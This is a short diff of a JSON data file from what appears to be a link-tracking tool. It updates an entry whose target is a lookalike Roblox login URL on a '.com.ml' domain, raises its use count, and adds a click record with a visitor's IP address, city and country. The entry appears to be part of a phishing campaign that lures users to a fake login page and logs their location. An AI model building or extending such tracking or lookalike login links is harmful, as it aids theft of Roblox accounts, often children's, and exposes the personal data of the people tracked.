@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 160,
+    "useCount": 161,
     "createdBy": "admin",
     "clicks": [
       {
@@ -1392,6 +1392,14 @@
         "city": "L'Union",
         "flag": "🇫🇷",
         "countryCode": "FR"
+      },
+      {
+        "timestamp": 1776957734532,
+        "ip": "31.4.242.141",
+        "country": "Spain",
+        "city": "Benavente",
+        "flag": "🇪🇸",
+        "countryCode": "ES"
       }
     ]
   },
